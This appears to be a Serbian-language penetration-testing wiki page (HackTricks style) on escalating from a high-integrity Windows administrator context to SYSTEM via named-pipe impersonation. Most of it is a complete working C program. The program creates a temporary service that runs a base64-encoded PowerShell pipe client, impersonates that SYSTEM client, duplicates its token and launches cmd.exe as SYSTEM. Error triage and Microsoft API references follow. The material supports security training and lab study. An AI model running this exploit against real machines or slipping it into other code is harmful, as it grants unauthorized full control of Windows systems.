# Od High Integrity do SYSTEM koristeći Name Pipes

{{#include ../../banners/hacktricks-training.md}}

Ovo je **administrator/SCM varijanta** impersonation-a putem named pipe-a: proces sa povišenim privilegijama kreira privremeni service čiji se child povezuje kao `SYSTEM`, a zatim impersonate-uje tog klijenta. Ako početni kontekst ne može da kreira service-e, ali ima `SeImpersonatePrivilege`, umesto toga upotrebite coercion privilegovanog service-a; pogledajte [Named Pipe Client Impersonation](named-pipe-client-impersonation.md) i [RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato](roguepotato-and-printspoofer.md). Kreiranje service-a zahteva pristup SCM-u i `SERVICE_START` pristup novom service-u, dok `CreateProcessWithTokenW` zahteva `SeImpersonatePrivilege`.<sup>[[2]](#references)[[3]](#references)</sup>

Brzo potvrdite očekivani početni kontekst:
```cmd
whoami /groups | findstr /i "High Mandatory"
whoami /priv | findstr /i "SeImpersonatePrivilege"
sc.exe query PiperSrv
```
**Tok koda:**

1. Kreirajte named-pipe server **pre** pokretanja servisa. Prilikom čekanja, tretirajte vraćanje `FALSE` iz `ConnectNamedPipe` sa `ERROR_PIPE_CONNECTED` kao uspeh: to znači da je klijent pobedio u trci i povezao se između poziva `CreateNamedPipe` i `ConnectNamedPipe`.<sup>[[4]](#references)</sup>
2. Kreirajte i pokrenite servis koji će se povezati sa kreiranim pipe-om i nešto upisati. Kod servisa će izvršiti ovaj kodiran PS kod: `$pipe = new-object System.IO.Pipes.NamedPipeClientStream("piper"); $pipe.Connect(); $sw = new-object System.IO.StreamWriter($pipe); $sw.WriteLine("Go"); $sw.Dispose();`
3. Nakon što se servis poveže i upiše podatke, pozovite `ImpersonateNamedPipeClient`, otvorite rezultujući thread token i duplicirajte ga kao primary token.<sup>[[1]](#references)</sup>
4. Upotrebite taj primary token za pokretanje `cmd.exe`.<sup>[[2]](#references)</sup>

Ovaj način pretpostavlja da caller može da kreira/pokrene servis i poseduje privilegije koje zahteva `CreateProcessWithTokenW` (obično `SeImpersonatePrivilege`). Ovo je high-integrity-to-SYSTEM tehnika, a ne primitive koji je dostupan proizvoljnom korisniku sa niskim privilegijama.<sup>[[2]](#references)[[3]](#references)</sup>

> [!WARNING]
> Ako kreiranje/pokretanje servisa ne uspe, primer ne signalizira pipe thread-u i može čekati neograničeno. Dodajte error handling i timeout za overlapped pipe pre upotrebe izvan laboratorije. Takođe koristite nasumično ime pipe-a/servisa kako biste izbegli kolizije.

`ImpersonateNamedPipeClient` usvaja context povezan sa **poslednjom pročitanom porukom**, pa sama konekcija nije dovoljna: učinite da privileged client upiše podatke, proverite da je `ReadFile` vratio podatke i tek onda izvršite impersonation. Duplicirajte thread impersonation token u `TokenPrimary` token sa `SecurityImpersonation`; primary token je ono što API za kreiranje procesa koristi.<sup>[[1]](#references)[[5]](#references)</sup>
```c
#include <windows.h>
#include <time.h>

#pragma comment (lib, "advapi32")
#pragma comment (lib, "kernel32")

#define PIPESRV "PiperSrv"
#define MESSAGE_SIZE 512

DWORD WINAPI ServiceGo(LPVOID lpParam) {

SC_HANDLE scManager;
SC_HANDLE scService;

scManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);

if (scManager == NULL) {
return FALSE;
}

// create Piper service
scService = CreateServiceA(scManager, PIPESRV, PIPESRV, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
"C:\\Windows\\System32\\cmd.exe /c powershell.exe -EncodedCommand JABwAGkAcABlACAAPQAgAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAFAAaQBwAGUAcwAuAE4AYQBtAGUAZABQAGkAcABlAEMAbABpAGUAbgB0AFMAdAByAGUAYQBtACgAIgBwAGkAcABlAHIAIgApADsAIAAkAHAAaQBwAGUALgBDAG8AbgBuAGUAYwB0ACgAKQA7ACAAJABzAHcAIAA9ACAAbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AUwB0AHIAZQBhAG0AVwByAGkAdABlAHIAKAAkAHAAaQBwAGUAKQA7ACAAJABzAHcALgBXAHIAaQB0AGUATABpAG4AZQAoACIARwBvACIAKQA7ACAAJABzAHcALgBEAGkAcwBwAG8AcwBlACgAKQA7AA==",
NULL, NULL, NULL, NULL, NULL);

if (scService == NULL) {
//printf("[!] CreateServiceA() failed: [%d]\n", GetLastError());
return FALSE;
}

// launch it
StartService(scService, 0, NULL);

// wait a bit and then cleanup
Sleep(10000);
DeleteService(scService);

CloseServiceHandle(scService);
CloseServiceHandle(scManager);
}

int main() {

LPCSTR sPipeName = "\\\\.\\pipe\\piper";
HANDLE hSrvPipe;
HANDLE th;
BOOL bPipeConn;
char pPipeBuf[MESSAGE_SIZE];
DWORD dBRead = 0;

HANDLE hImpToken;
HANDLE hNewToken;
STARTUPINFOW si;
PROCESS_INFORMATION pi;

// open pipe
hSrvPipe = CreateNamedPipeA(sPipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_WAIT,
PIPE_UNLIMITED_INSTANCES, 1024, 1024, 0, NULL);

// create and run service
th = CreateThread(0, 0, ServiceGo, NULL, 0, 0);

// wait for the connection from the service
bPipeConn = ConnectNamedPipe(hSrvPipe, NULL);
if (!bPipeConn && GetLastError() == ERROR_PIPE_CONNECTED) {
bPipeConn = TRUE; // Client connected between CreateNamedPipe and ConnectNamedPipe
}
if (bPipeConn) {
if (!ReadFile(hSrvPipe, &pPipeBuf, MESSAGE_SIZE, &dBRead, NULL) || dBRead == 0) {
return -6;
}

// impersonate the service (SYSTEM)
if (ImpersonateNamedPipeClient(hSrvPipe) == 0) {
return -1;
}

// wait for the service to cleanup
WaitForSingleObject(th, INFINITE);

// get a handle to impersonated token
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hImpToken)) {
return -2;
}

// create new primary token for new process
if (!DuplicateTokenEx(hImpToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation,
TokenPrimary, &hNewToken)) {
return -4;
}

//Sleep(20000);
// spawn cmd.exe as full SYSTEM user
ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);
ZeroMemory(&pi, sizeof(pi));
if (!CreateProcessWithTokenW(hNewToken, 0, L"C:\\Windows\\System32\\cmd.exe", NULL,
CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
return -5;
}

// revert back to original security context
RevertToSelf();

}

return 0;
}
```
### Trijaža grešaka

- `ConnectNamedPipe == FALSE` sa `ERROR_PIPE_CONNECTED`: nastavite; pipe je već povezan.<sup>[[4]](#references)</sup>
- `ImpersonateNamedPipeClient` nije uspeo sa `ERROR_CANNOT_IMPERSONATE` (`1368`): potvrdite da je SYSTEM klijent zaista upisao podatke i da je `ReadFile` završen. Takođe proverite klijentov zatraženi nivo impersonation-a; klijenti na identification/anonymous nivou ne mogu biti u potpunosti impersonated.<sup>[[1]](#references)</sup>
- `CreateProcessWithTokenW` nije uspeo sa `ERROR_PRIVILEGE_NOT_HELD` (`1314`): originalni caller nema `SeImpersonatePrivilege`. Iz high-integrity administratorskog konteksta koristite token-copy rutu dokumentovanu u [SeImpersonate from High To System](seimpersonate-from-high-to-system.md), ili koristite `CreateProcessAsUserW` dok impersonirate SYSTEM, ako su potrebne privilegije prisutne.<sup>[[2]](#references)</sup>
- `CreateServiceA` vraća `ERROR_SERVICE_EXISTS` (`1073`): obrišite zastareli `PiperSrv` unos ili randomizujte `PIPESRV`; uvek obrišite privremeni service nakon trigger-a.<sup>[[3]](#references)</sup>



## References

- [1] [Microsoft Learn — `ImpersonateNamedPipeClient`](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [2] [Microsoft Learn — `CreateProcessWithTokenW`](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [3] [Microsoft Learn — `CreateServiceA`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea)
- [4] [Microsoft Learn — `ConnectNamedPipe`](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-connectnamedpipe)
- [5] [Microsoft Learn — `DuplicateTokenEx`](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex)
{{#include ../../banners/hacktricks-training.md}}
